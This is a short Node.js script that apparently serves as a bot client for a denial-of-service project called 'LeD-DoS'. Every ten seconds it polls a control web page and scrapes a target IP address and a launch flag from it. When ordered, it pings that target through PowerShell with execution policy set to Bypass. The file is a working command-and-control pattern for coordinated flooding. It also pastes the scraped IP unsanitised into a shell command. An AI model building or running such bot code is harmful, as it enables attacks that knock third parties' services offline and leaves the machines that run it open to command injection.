const request = require('request');
const cheerio = require('cheerio');
var ping = require('ping');
var fs = require('fs');
const Shell = require('node-powershell');

setInterval(function () {

    request('http://localhost/LeD-DoS/Web/dos.php', (error, response, html) => {
        if (!error && response.statusCode == 200) {
            const $ = cheerio.load(html);

            const ip = $('.ip');
            const output = ip.find('p').text();

            const check = $('.check');
            const gotime = check.find('p').text();

            var current = fs.readFile("ip.txt", function(err, current){
                // console.log("IP: " + output + ", Active: " + gotime + ", Current IP: " + current.toString());
            });

            // if (output != current) {
            //     fs.writeFile("ip.txt", output, (err) => {
            //         if (err) console.log(err);
            //         console.log("Updated IP to " + output);
            //       });
            // }

            if (gotime == 1) {

                const ps = new Shell({
                    executionPolicy: 'Bypass',
                    noProfile: true
                  });
                   
                  ps.addCommand('ping ' + output);
                  ps.invoke()
                  .then(output => {
                    console.log(output);
                  })
                  .catch(err => {
                    console.log(err);
                  });

                // var hosts = [output];
                // hosts.forEach(function (host) {
                //     ping.sys.probe(host, function (isAlive) {
                //         var msg = isAlive ? 'IP ' + host + ' is being PINGED' : 'host ' + host + ' is not avalible';
                //         console.log(msg);
                //     });
                // });
            }
            
            if (gotime != '1') {
                console.log("Awaitng Launch Order!")
            }
        }
    });
}, 10000);